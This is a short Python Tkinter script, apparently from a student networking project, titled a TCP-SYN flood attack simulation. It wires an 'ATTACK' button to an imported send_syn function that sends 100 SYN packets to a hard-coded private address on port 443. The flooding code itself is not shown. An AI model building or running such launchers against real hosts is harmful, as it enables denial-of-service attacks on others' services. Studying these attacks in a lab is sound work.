# TCP-SYN Flood Attack Simulation GUI

# Modules
import sys
from tkinter import *

sys.path.insert(0, "/home/kali/Desktop/CNProject2022/source")

from syn import *

# Functions
def attack():
    ip = "172.22.8.1"
    port = 443
    send_syn(ip, port, total_packets=100)

# GUI
root = Tk()
root.geometry("200x200")

label = Label(root, text = "foo")
button1 = Button(root, text = "ATTACK!!!!!", command = attack)
button2 = Button(root, text = "destroy", command = root.destroy)

label.pack()
button1.place(relx = 0.5, rely = 0.3, anchor = CENTER)
button2.place(relx = 0.5, rely = 0.6, anchor = CENTER)

root.mainloop()